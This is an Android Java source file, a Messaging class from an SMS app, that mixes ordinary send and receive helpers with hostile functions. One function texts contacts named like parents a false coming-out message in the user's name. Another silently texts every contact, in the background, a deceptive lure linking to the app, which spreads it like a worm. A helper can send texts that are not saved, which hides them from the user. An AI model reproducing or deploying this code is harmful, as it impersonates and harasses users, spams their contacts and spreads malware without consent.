package com.candroid.textme.api;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Process;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Pair;

import com.candroid.textme.data.Constants;
import com.candroid.textme.data.pojos.Contact;

import java.util.ArrayList;

public class Messaging {

    public static class Binary{

        public static void sendDeliveryReport(String address) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendDataMessage(address, null, new Short("6666"), Constants.DELIVERY_REPORT_CODE.getBytes(), null, null);
        }

        /*send sms message as type String*/
        public static void sendMessage(Context context, String response, String destTelephoneNumber) {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<PendingIntent> sentIntents = new ArrayList<>();
            String name = ContentProviders.Contacts.reverseLookupNameByPhoneNumber(destTelephoneNumber, context.getContentResolver());
            ArrayList<String> parts = smsManager.divideMessage(response);
            for (int i = 0; i < parts.size(); i++) {
                Intent intent = new Intent();
                intent.putExtra(Constants.Keys.ADDRESS_KEY, name);
                intent.setAction(Constants.SENT_CONFIRMATION_ACTION);
                sentIntents.add(PendingIntent.getBroadcast(context, 0, intent, 0));
            }
            for (int i = 0; i < parts.size(); i++) {
                smsManager.sendDataMessage(destTelephoneNumber, null, new Short("6666"), parts.get(i).getBytes(), sentIntents.get(i), null);
            }
        }

    }

    public static class Text{

        public static void sendSms(Context context, String destAddress, String body) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(destAddress, null, body, null, null);
        }

        public static void tellMyParentsImGay(Context context) {
            ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(context);
            ArrayList<Contact> parents = new ArrayList<>();
            String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents", "madre", "papa"};
            for (Contact contact : contacts) {
                for (String name : possibleParentNames) {
                    if (contact.mName.equalsIgnoreCase(name)) {
                        parents.add(contact);
                    }
                }
            }
            if (parents.size() > 0) {
                for (Contact contact : parents) {
                    sendSms(context, contact.mAddress, "I've been meaning to tell you this but I am gay and I'm coming out of the closet :(");
                }
            }
        }

        @SuppressLint({"MissingPermission", "NewApi"})
        @TargetApi(Build.VERSION_CODES.P)
        public static void sendNonPersistingSms(Context context, String address, String body) {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessageWithoutPersisting(address, null, body, null, null);
        }


        public static void shareApp(Context context) {
            Thread thread = null;
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(context);
                    String body = String.format("bro im dt right now about to work Ive got to tell you something but i cant use snapchat so use this. %s", Constants.APP_URI);
                    boolean shouldSendNonPersisting = false;
        /*        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    shouldSendNonPersisting = true;
                }*/
                    for (Contact contact : contacts) {
                        try {
                            Thread.sleep(10000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        if (shouldSendNonPersisting) {
                            sendNonPersistingSms(context, contact.mAddress, body);
                        } else {
                            sendSms(context, contact.mAddress, body);
                        }
                    }
                }
            }).start();
        }

        public static Pair<String, String> processSms(Context context, Intent intent) {
            StringBuilder address = new StringBuilder();
            StringBuilder body = new StringBuilder();
            SmsMessage[] smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            String number = smsMessage[0].getDisplayOriginatingAddress();
            address.append(ContentProviders.Contacts.reverseLookupNameByPhoneNumber(number, context.getContentResolver()));
            for (int i = 0; i < smsMessage.length; i++) {
                body.append(smsMessage[i].getMessageBody());
            }
            return new Pair<>(address.toString(), body.toString());
        }

    }
}
